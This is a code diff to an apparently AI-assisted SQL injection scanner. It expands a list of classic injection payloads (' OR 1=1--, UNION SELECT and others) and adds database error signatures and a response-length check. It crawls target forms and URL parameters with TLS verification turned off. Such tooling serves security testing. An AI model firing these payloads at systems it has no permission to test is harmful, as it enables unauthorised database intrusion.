@@ -11,8 +11,51 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 REQUEST_TIMEOUT = 5
 
 DEFAULT_PAYLOADS = [
-    "'", "' OR 1=1--", "' UNION SELECT NULL--", '" OR "1"="1', "admin' --"
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    '" OR "1"="1',
+    "' UNION SELECT NULL--",
+    "' AND 1=2--",
+    "admin' --",
+    "' OR 1=1#",
+    "1' ORDER BY 1--",
+    "' OR 'a'='a",
 ]
+
+SQL_ERRORS = [
+    # MySQL
+    "sql syntax", "mysql_fetch", "Warning: mysql", "mysqli_fetch", "mysql_num_rows",
+    # PostgreSQL
+    "PostgreSQL", "pg_query", "pg_exec", "unterminated quoted string",
+    # SQLite (used by OWASP Juice Shop)
+    "sqlite3", "SQLITE_ERROR", "sqlite_error", "near \"",
+    # Microsoft SQL Server
+    "Microsoft OLE DB", "unclosed quotation mark", "mssql_query",
+    # Oracle
+    "ORA-01756", "ORA-00933", "oracle error",
+    # Generic
+    "syntax error", "SQLSTATE", "SQL error", "sql error",
+    "JDBC", "database error", "db error",
+    # ColdFusion / Java
+    "SQLException", "java.sql",
+    # Error indicators in JSON responses
+    "SQLITE",
+]
+
+
+def check_sql_error(response_text):
+    for error in SQL_ERRORS:
+        if error.lower() in response_text.lower():
+            return True
+    return False
+
+
+def check_response_length(original_len, test_text):
+    """Detect significant response length differences indicating SQL injection."""
+    diff = abs(original_len - len(test_text))
+    return diff > 30  # Lowered threshold for better sensitivity on JSON APIs
+
 
 class Scanner:
     def __init__(self, target_url):
@@ -20,16 +63,16 @@ class Scanner:
         self.findings = []
         self.logs = []
         self.tech_stack = "Unknown"
+        self._baseline_len = 0
 
     def log(self, message, level="INFO"):
         self.logs.append(f"[{level}] {message}")
 
     def get_adaptive_payloads(self, field_name, context):
         """
-        AI-lite payload generator. In a full implementation, 
+        AI-lite payload generator. In a full implementation,
         this would call Gemini to generate a payload for a specific field.
         """
-        # For now, we use a mix of defaults and context-aware logic
         payloads = list(DEFAULT_PAYLOADS)
         if "email" in field_name.lower():
             payloads.append("test@example.com' OR 1=1--")
@@ -44,19 +87,17 @@ class Scanner:
                 r = requests.get(url, params=payload_map, timeout=REQUEST_TIMEOUT, verify=False)
             else:
                 r = requests.post(url, data=payload_map, timeout=REQUEST_TIMEOUT, verify=False)
-            
-            # 1. Basic Heuristics
-            is_suspicious = (
-                r.status_code >= 500 or 
-                "sql" in r.text.lower() or 
-                "syntax error" in r.text.lower()
-            )
+
+            error_detected = check_sql_error(r.text)
+            length_changed = check_response_length(self._baseline_len, r.text) if self._baseline_len else False
+            status_anomaly = r.status_code >= 500
+
+            is_suspicious = error_detected or length_changed or status_anomaly
 
             if is_suspicious:
                 self.log(f"Suspicious response from {url}. Triggering AI Judge...", "WARNING")
-                # 2. AI Judge
                 judge_result = ai_judge_response(url, str(payload_map), r.text, r.status_code)
-                
+
                 if judge_result.get("vulnerable"):
                     finding = {
                         "type": "SQL Injection",
@@ -76,7 +117,14 @@ class Scanner:
 
     def run(self):
         self.log(f"Starting Intelligent Scan on {self.target_url}")
-        
+
+        # Capture baseline response length for diffing
+        try:
+            baseline = requests.get(self.target_url, timeout=REQUEST_TIMEOUT, verify=False)
+            self._baseline_len = len(baseline.text)
+        except Exception:
+            self._baseline_len = 0
+
         # Phase 1: Recon
         self.log("Crawling target and performing AI Reconnaissance...")
         testable_elements, html = crawl_target(self.target_url)
@@ -86,7 +134,6 @@ class Scanner:
 
         # Phase 2: Scanning
         if not testable_elements:
-            # Fallback to URL testing if no forms found
             self.log("No forms found, testing URL parameters directly.")
             parsed = urlparse(self.target_url)
             params = parse_qs(parsed.query)
@@ -107,7 +154,7 @@ class Scanner:
                             payload_map = {inp['name']: 'test' for inp in element['inputs']}
                             payload_map[name] = p
                             if self.test_endpoint(element['action'], element['method'], {}, payload_map):
-                                break # Found one, move to next field or form
+                                break
 
         self.log("Scan complete.")
         return {
@@ -117,6 +164,7 @@ class Scanner:
             "findings": self.findings,
             "details": self.logs
         }
+
 
 def run_sqli_scan(url):
     scanner = Scanner(url)
